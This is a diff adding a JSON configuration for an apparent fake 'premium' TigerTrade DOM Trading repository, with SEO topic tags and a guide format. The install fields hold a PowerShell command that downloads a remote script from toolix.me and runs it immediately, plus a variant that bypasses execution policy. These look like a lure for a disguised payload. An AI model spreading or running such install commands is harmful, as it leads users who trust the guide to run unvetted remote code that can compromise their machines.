@@ -1,0 +1,26 @@
+{
+  "repo": "TigerTrade-DOM-Trading-Full-Premium",
+  "product": "TigerTrade DOM Trading Premium",
+  "product_title": "TigerTrade DOM Trading",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "system-tools",
+  "topics": [
+    "how-to-install-tigertrade-dom-trading",
+    "tigertrade-dom-trading-app",
+    "repository-readme",
+    "install-guide",
+    "desktop-software",
+    "tigertrade-dom-trading-desktop-tool",
+    "tigertrade-dom-trading-windows-tool",
+    "tigertrade-dom-trading",
+    "windows-11",
+    "windows-desktop"
+  ],
+  "site": "toolix.me"
+}
